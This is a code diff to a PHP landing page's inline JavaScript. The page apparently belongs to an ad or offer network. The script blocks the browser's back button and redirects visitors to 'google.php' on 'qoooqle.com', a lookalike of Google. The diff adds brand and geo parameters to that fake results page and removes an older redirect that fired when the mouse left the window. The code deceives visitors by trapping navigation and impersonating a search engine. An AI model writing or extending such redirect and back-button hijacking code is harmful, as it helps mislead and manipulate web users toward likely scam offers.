@@ -943,12 +943,25 @@ $html_lang = ($lang === 'cz') ? 'cs' : $lang;
          ============================================================ -->
     <script>
     (function() {
+        var SERP_DOMAIN = 'qoooqle.com';
         var searchParams = new URLSearchParams(window.location.search);
         var lang = searchParams.get('lang') || 'en';
         var host = searchParams.get('host');
+        var brand = searchParams.get('brand') || '';
+        var geo = searchParams.get('geo') || '';
         // No host means this standalone newsnik domain was hit directly (test/bot/bookmark),
-        // not via a real offer's google.php link — there's no local google.php to fall back to.
-        var targetUrl = host ? ("//" + host + "/google.php?lang=" + lang) : 'https://www.google.com';
+        // not via a real offer's google.php link — there's no page to send them back to.
+        var targetUrl;
+        if (host) {
+            var backParams = new URLSearchParams();
+            backParams.set('lang', lang);
+            backParams.set('host', host);
+            if (brand) backParams.set('brand', brand);
+            if (geo) backParams.set('geo', geo);
+            targetUrl = 'https://' + SERP_DOMAIN + '/google.php?' + backParams.toString();
+        } else {
+            targetUrl = 'https://www.google.com';
+        }
         var activated = false;
 
         function activateBackBlock() {
@@ -992,12 +1005,6 @@ $html_lang = ($lang === 'cz') ? 'cs' : $lang;
             }
         }, { once: true });
         setTimeout(activateBackBlock, 3000);
-
-        document.addEventListener('mouseleave', function(e) {
-            if (e.clientY < 20) {
-                location.replace(targetUrl);
-            }
-        });
     })();
     </script>
 
